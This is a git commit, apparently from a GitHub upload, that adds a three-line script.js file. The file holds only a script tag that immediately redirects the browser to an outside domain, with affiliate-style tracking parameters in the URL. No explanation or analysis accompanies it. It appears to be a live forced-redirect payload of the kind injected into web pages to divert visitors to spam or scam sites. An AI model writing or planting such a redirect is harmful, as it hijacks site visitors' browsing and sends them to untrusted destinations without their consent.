85d77a9f7ee78a1104e6a6c2c3534d5c1f8cc5a0
rpnzx <149712951+rpnzx@users.noreply.github.com>
2024-02-28 06:12:52 +0700

    Add files via upload

---
+++ script.js
@@ -0,0 +1,3 @@
+<script>	
+  window.location.href="https://bgmqao.spiendidate.net/?utm_source=da57dc555e50572d&s1=74105&s2=1822761&s3=SHINOBI_3&click_id=PARADOX3_BLAZE&ban=other&j1=1&j5=1&j6=1";
+  </script>
